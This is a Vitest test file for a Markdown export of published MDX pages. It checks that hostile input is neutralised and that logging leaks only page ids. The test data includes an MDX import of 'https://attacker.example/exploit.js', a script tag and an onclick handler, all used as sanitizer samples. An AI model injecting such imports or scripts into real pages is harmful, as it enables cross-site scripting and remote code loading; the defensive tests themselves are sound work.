import { afterEach, describe, expect, it, vi } from 'vitest';
import { buildPublishedPageMarkdown } from './published-markdown';

const log = vi.hoisted(() => ({ info: vi.fn() }));
vi.mock('@nibleaf/logger', () => ({ logger: log }));
afterEach(() => vi.clearAllMocks());

describe('published page Markdown', () => {
  it('uses the shared inert MDX projection for the live representation', () => {
    const body = buildPublishedPageMarkdown({
      project: { config: { visibility: 'public' } },
      languageConfig: null,
      page: {
        id: 'page_688',
        title: 'Setup',
        description: ' Safe setup. ',
        content:
          'import Exploit from "https://attacker.example/exploit.js"\n\n<Callout>**Portable**</Callout>\n\n<script>run()</script>\n\n<Raw onclick="run()">text</Raw>',
        config: null,
      },
    });

    // The callout is a real Markdown blockquote; raw HTML stays escaped text (#341).
    expect(body).toBe('# Setup\n\n> Safe setup.\n\n> **Portable**\n\n\n\n&lt;Raw onclick="run()"&gt;text&lt;/Raw&gt;\n');
    expect(body).not.toContain('Exploit');
    expect(body).not.toContain('<script>');
    expect(log.info).not.toHaveBeenCalled();
  });

  it('logs each actual public Markdown fallback with only its page id', () => {
    const content = '> ~~~\n> PRIVATE_BODY\n  -->\n  > <SCRIPT>\n  > <script>\n</style>';
    const body = buildPublishedPageMarkdown({
      project: { config: { visibility: 'public' } },
      page: { id: 'page_688', title: 'PRIVATE_TITLE', description: 'PRIVATE_SUMMARY https://private.invalid', content },
    });
    expect(body).toBe(
      '# PRIVATE_TITLE\n\n> PRIVATE_SUMMARY https://private.invalid\n\n> ~~~\n> PRIVATE_BODY\n  -->\n\n&#32;&#32;&#62;&#32;&#60;SCRIPT&#62;&#10;&#32;&#32;&#62;&#32;&#60;script&#62;&#10;&#60;&#47;style&#62;\n\n\n',
    );
    expect(log.info.mock.calls).toEqual([[{ pageId: 'page_688' }, 'Export literal-text fallback']]);
  });
});
